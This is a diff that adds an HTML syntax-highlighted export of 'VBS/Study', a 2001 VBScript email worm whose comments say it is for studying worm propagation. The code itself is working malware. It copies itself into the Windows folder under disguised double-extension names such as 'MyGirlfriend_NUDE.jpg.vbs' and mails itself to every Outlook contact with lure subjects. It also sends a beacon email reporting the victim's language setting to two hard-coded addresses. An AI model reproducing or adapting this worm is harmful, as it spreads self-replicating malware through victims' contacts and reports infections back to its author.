@@ -1,0 +1,90 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'VBS/Study by PetiK     ©2001.                              15/02/2001
+'Merci à FireBurn, Melissa, Monopoly et Prolin
+'Ce programme permet d'étudier la propagation des vers.
+'To study the propagation of worms.
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">O</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">mapi</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">O.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">AddList</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">mapi.AddressLists</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">AddList.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">AddListCount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">AddList.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">AddListEntry</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AddList.AddressEntries</span><span class="sc6">(</span><span class="sc7">AddListCount</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">msg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">O.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">msg.To</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AddListEntry.Address</span><span class="sc0">
+</span><span class="sc7">Randomize</span><span class="sc0">
+</span><span class="sc7">Num</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">((</span><span class="sc2">4</span><span class="sc6">*</span><span class="sc7">Rnd</span><span class="sc6">)+</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc4">"\MyGirlfriend_NUDE.jpg.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">msg.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Hi, how are you ?"</span><span class="sc0">
+</span><span class="sc7">msg.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Hi, look at this nice Pic attached !"</span><span class="sc0">
+</span><span class="sc7">msg.Attachments.add</span><span class="sc0"> </span><span class="sc7">fso.BuildPath</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"MyGirlfriend_NUDE.jpg.vbs"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc4">"\Winword.doc.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">msg.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Important Message"</span><span class="sc0">
+</span><span class="sc7">msg.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0">  </span><span class="sc7">vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Here is that document you asked"</span><span class="sc0">
+</span><span class="sc7">msg.Attachments.add</span><span class="sc0"> </span><span class="sc7">fso.BuildPath</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"Winword.doc.vbs"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc4">"\MONOPOLY.VBS"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">msg.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Bill Gates joke"</span><span class="sc0">
+</span><span class="sc7">msg.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Bill Gates is guitly of monopoly. Here is the proof. :-)"</span><span class="sc0">
+</span><span class="sc7">msg.Attachments.add</span><span class="sc0"> </span><span class="sc7">fso.BuildPath</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"MONOPOLY.VBS"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc4">"\CREATIVE.exe.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">msg.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"A great Shockwave flash movie"</span><span class="sc0">
+</span><span class="sc7">msg.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Check out this new flash movie that I download just now... It's Great."</span><span class="sc0">
+</span><span class="sc7">msg.Attachments.add</span><span class="sc0"> </span><span class="sc7">fso.BuildPath</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"CREATIVE.exe.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">msg.To</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">msg.Send</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">msg2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">O.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">msg2.BCC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Panda34@caramail.com; Pentasm99@aol.com"</span><span class="sc0">
+</span><span class="sc7">PAYS</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ws.RegRead</span><span class="sc6">(</span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">msg2.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"VBS/Study arrivant de "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">PAYS</span><span class="sc0">
+</span><span class="sc7">msg2.Send</span><span class="sc0">
+</span></div></body>
+</html>
